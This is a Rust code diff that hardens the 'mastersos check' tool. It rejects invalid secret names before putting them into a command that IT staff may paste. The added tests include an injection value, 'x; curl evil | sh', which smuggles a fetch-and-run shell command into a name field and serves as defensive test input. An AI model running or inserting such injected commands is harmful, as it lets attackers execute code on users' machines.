@@ -589,15 +589,17 @@ fn lint_values(lints: &[mastersos_bundle::Lint]) -> Vec<Value> {
 /// What `mastersos check` prints after the issues when secrets are rerouted: publishing stops
 /// on them until IT approves each one by name.
 fn reroute_notice(lints: &[mastersos_bundle::Lint]) -> Option<String> {
+    // `rerouted_names` keeps only valid names (a-z, 0-9, -); checked again here because the
+    // names go into a command IT may paste.
     let names = mastersos_bundle::secret_ref::rerouted_names(lints);
-    if names.is_empty() {
+    if names.is_empty()
+        || !names
+            .iter()
+            .all(|n| mastersos_bundle::secret_ref::is_valid_name(n))
+    {
         return None;
     }
-    // Secret names are checked to be a-z, 0-9 and hyphens; escape anyway, they come from a file.
-    let names: Vec<String> = names
-        .iter()
-        .map(|n| n.escape_default().to_string())
-        .collect();
+    let names: Vec<String> = names.into_iter().collect();
     let flags: Vec<String> = names
         .iter()
         .map(|n| format!("--allow-reroute {n}"))
@@ -1012,6 +1014,9 @@ mod tests {
             "{n}"
         );
         assert!(n.contains("never passes --allow-reroute"), "{n}");
+        // A name that is not a-z, 0-9, - is never put into the suggested command.
+        assert!(reroute_notice(&[lint("x; curl evil | sh")]).is_none());
+        assert!(reroute_notice(&[lint("Upper")]).is_none());
     }
 
     #[test]
